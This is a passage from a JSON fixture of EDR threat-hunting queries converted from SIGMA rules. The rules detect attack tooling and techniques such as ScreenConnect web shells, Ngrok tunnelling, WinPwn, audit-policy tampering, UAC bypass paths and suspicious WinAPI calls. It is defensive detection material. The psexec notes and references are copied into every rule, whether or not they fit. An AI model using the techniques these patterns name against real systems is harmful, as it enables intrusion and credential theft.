            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 593
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a Chromium based browser process with the 'load-extension' flag to start a instance with a custom extension",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1176"
            ],
            "name": "Chromium Browser Instance Executed With Custom Extension",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--load-extension=\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 594
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an executable in the users directory started from one of the Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204"
            ],
            "name": "Suspicious Binary In User Directory Spawned From Office Application",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WINWORD.EXE\" or src.process.image.path contains \"\\EXCEL.EXE\" or src.process.image.path contains \"\\POWERPNT.exe\" or src.process.image.path contains \"\\MSPUB.exe\" or src.process.image.path contains \"\\VISIO.exe\" or src.process.image.path contains \"\\MSACCESS.exe\" or src.process.image.path contains \"\\EQNEDT32.exe\") and tgt.process.image.path contains \"C:\\users\\\" and tgt.process.image.path contains \".exe\") and (not tgt.process.image.path contains \"\\Teams.exe\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 595
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential web shell execution from the ScreenConnect server process.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1190"
            ],
            "name": "Remote Access Tool - ScreenConnect Server Web Shell Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\ScreenConnect.Service.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\csc.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 596
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"forfiles\" from a non-default location, in order to potentially spawn a custom \"cmd.exe\" from the current working directory.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Forfiles.EXE Child Process Masquerading",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.cmdline contains \".exe\" or src.process.cmdline contains \".exe\\\"\") and tgt.process.image.path contains \"\\cmd.exe\" and tgt.process.cmdline contains \"/c echo \\\"\") and (not ((src.process.image.path contains \":\\Windows\\System32\\\" or src.process.image.path contains \":\\Windows\\SysWOW64\\\") and src.process.image.path contains \"\\forfiles.exe\" and (tgt.process.image.path contains \":\\Windows\\System32\\\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\\") and tgt.process.image.path contains \"\\cmd.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 597
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Amazon SSM Agent Hijacking",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\amazon-ssm-agent.exe\" and (tgt.process.cmdline contains \"-register \" and tgt.process.cmdline contains \"-code \" and tgt.process.cmdline contains \"-id \" and tgt.process.cmdline contains \"-region \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 598
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files')",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Remote Access Tool - RURAT Execution From Unusual Location",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rutserv.exe\" or tgt.process.image.path contains \"\\rfusclient.exe\") or tgt.process.displayName=\"Remote Utilities\") and (not (tgt.process.image.path contains \"C:\\Program Files\\Remote Utilities\" or tgt.process.image.path contains \"C:\\Program Files (x86)\\Remote Utilities\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 599
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Scripting/CommandLine Process Spawned Regsvr32",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\cscript.exe\" or src.process.image.path contains \"\\mshta.exe\" or src.process.image.path contains \"\\powershell_ise.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\" or src.process.image.path contains \"\\wscript.exe\") and tgt.process.image.path contains \"\\regsvr32.exe\") and (not (src.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and tgt.process.cmdline contains \" /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 600
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects possible execution via LNK file accessed on a WebDAV server.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1204"
            ],
            "name": "Potentially Suspicious WebDAV LNK Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\explorer.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") and tgt.process.cmdline contains \"\\DavWWWRoot\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 601
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Greedy Compression Using Rar.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rar.exe\" or tgt.process.displayName=\"Command line RAR\") or (tgt.process.cmdline contains \".exe a \" or tgt.process.cmdline contains \" a -m\")) and ((tgt.process.cmdline contains \" -hp\" and tgt.process.cmdline contains \" -r \") and (tgt.process.cmdline=\"* *:\\\\*.*\" or tgt.process.cmdline=\"* *:\\\\\\*.*\" or tgt.process.cmdline=\"* *:\\$Recycle.bin\\*\" or tgt.process.cmdline=\"* *:\\PerfLogs\\*\" or tgt.process.cmdline=\"* *:\\Temp*\" or tgt.process.cmdline=\"* *:\\Users\\Public\\*\" or tgt.process.cmdline=\"* *:\\Windows\\*\" or tgt.process.cmdline contains \" %public%\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 602
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1046",
                "t1082",
                "t1106",
                "t1518",
                "t1548",
                "t1552",
                "t1555",
                "t1555"
            ],
            "name": "HackTool - WinPwn Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Offline_Winpwn\" or tgt.process.cmdline contains \"WinPwn \" or tgt.process.cmdline contains \"WinPwn.exe\" or tgt.process.cmdline contains \"WinPwn.ps1\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 603
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Audit Policy Tampering Via NT Resource Kit Auditpol",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"/logon:none\" or tgt.process.cmdline contains \"/system:none\" or tgt.process.cmdline contains \"/sam:none\" or tgt.process.cmdline contains \"/privilege:none\" or tgt.process.cmdline contains \"/object:none\" or tgt.process.cmdline contains \"/process:none\" or tgt.process.cmdline contains \"/policy:none\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 604
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1106"
            ],
            "name": "Potential WinAPI Calls Via CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"AddSecurityPackage\" or tgt.process.cmdline contains \"AdjustTokenPrivileges\" or tgt.process.cmdline contains \"Advapi32\" or tgt.process.cmdline contains \"CloseHandle\" or tgt.process.cmdline contains \"CreateProcessWithToken\" or tgt.process.cmdline contains \"CreatePseudoConsole\" or tgt.process.cmdline contains \"CreateRemoteThread\" or tgt.process.cmdline contains \"CreateThread\" or tgt.process.cmdline contains \"CreateUserThread\" or tgt.process.cmdline contains \"DangerousGetHandle\" or tgt.process.cmdline contains \"DuplicateTokenEx\" or tgt.process.cmdline contains \"EnumerateSecurityPackages\" or tgt.process.cmdline contains \"FreeHGlobal\" or tgt.process.cmdline contains \"FreeLibrary\" or tgt.process.cmdline contains \"GetDelegateForFunctionPointer\" or tgt.process.cmdline contains \"GetLogonSessionData\" or tgt.process.cmdline contains \"GetModuleHandle\" or tgt.process.cmdline contains \"GetProcAddress\" or tgt.process.cmdline contains \"GetProcessHandle\" or tgt.process.cmdline contains \"GetTokenInformation\" or tgt.process.cmdline contains \"ImpersonateLoggedOnUser\" or tgt.process.cmdline contains \"kernel32\" or tgt.process.cmdline contains \"LoadLibrary\" or tgt.process.cmdline contains \"memcpy\" or tgt.process.cmdline contains \"MiniDumpWriteDump\" or tgt.process.cmdline contains \"ntdll\" or tgt.process.cmdline contains \"OpenDesktop\" or tgt.process.cmdline contains \"OpenProcess\" or tgt.process.cmdline contains \"OpenProcessToken\" or tgt.process.cmdline contains \"OpenThreadToken\" or tgt.process.cmdline contains \"OpenWindowStation\" or tgt.process.cmdline contains \"PtrToString\" or tgt.process.cmdline contains \"QueueUserApc\" or tgt.process.cmdline contains \"ReadProcessMemory\" or tgt.process.cmdline contains \"RevertToSelf\" or tgt.process.cmdline contains \"RtlCreateUserThread\" or tgt.process.cmdline contains \"secur32\" or tgt.process.cmdline contains \"SetThreadToken\" or tgt.process.cmdline contains \"VirtualAlloc\" or tgt.process.cmdline contains \"VirtualFree\" or tgt.process.cmdline contains \"VirtualProtect\" or tgt.process.cmdline contains \"WaitForSingleObject\" or tgt.process.cmdline contains \"WriteInt32\" or tgt.process.cmdline contains \"WriteProcessMemory\" or tgt.process.cmdline contains \"ZeroFreeGlobalAllocUnicode\") and (not (tgt.process.image.path contains \"\\MpCmdRun.exe\" and tgt.process.cmdline contains \"GetLoadLibraryWAddress32\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 605
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\nInvolved domains are bin.equinox.io for download and *.ngrok.io for connections.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "PUA - Ngrok Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" tcp 139\" or tgt.process.cmdline contains \" tcp 445\" or tgt.process.cmdline contains \" tcp 3389\" or tgt.process.cmdline contains \" tcp 5985\" or tgt.process.cmdline contains \" tcp 5986\") or (tgt.process.cmdline contains \" start \" and tgt.process.cmdline contains \"--all\" and tgt.process.cmdline contains \"--config\" and tgt.process.cmdline contains \".yml\") or (tgt.process.image.path contains \"ngrok.exe\" and (tgt.process.cmdline contains \" tcp \" or tgt.process.cmdline contains \" http \" or tgt.process.cmdline contains \" authtoken \")) or (tgt.process.cmdline contains \".exe authtoken \" or tgt.process.cmdline contains \".exe start --all\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 606
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1202"
            ],
            "name": "Suspicious Remote Child Process From Outlook",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\outlook.exe\" and tgt.process.image.path contains \"\\\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 607
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects indicators of a UAC bypass method by mocking directories",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "TrustedPath UAC Bypass Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"C:\\Windows \\System32\\\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 608
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of CustomShellHost binary where the child isn't located in 'C:\\Windows\\explorer.exe'",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Suspicious CustomShellHost Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
